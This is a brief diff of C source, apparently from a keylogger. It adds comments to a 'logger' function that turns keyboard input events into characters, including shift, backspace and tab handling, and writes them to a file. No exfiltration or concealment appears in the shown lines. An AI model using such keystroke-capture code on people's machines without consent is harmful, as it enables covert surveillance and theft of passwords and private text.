@@ -174,6 +174,7 @@ void* logger(void* kb_path){
           //flush file stream (write to file)
           fflush(fptr);
           break;
+	//special cases first
         case KEY_BACKSPACE:
           long size = ftell(fptr);
           if(size > 0){
@@ -191,10 +192,13 @@ void* logger(void* kb_path){
           fprintf(fptr, "\t");
           fflush(fptr);
           break;
+	//default case (letter)
         default:
+	  //shift and a special character
           if(shift && shift_table[event.code] != '\0'){
             fprintf(fptr, "%c", shift_table[event.code]);
             fflush(fptr);
+	  //shift and an letter
           } else if(shift && shift_table[event.code] == '\0'){
             fprintf(fptr, "%c", toupper(table[event.code]));
             fflush(fptr);
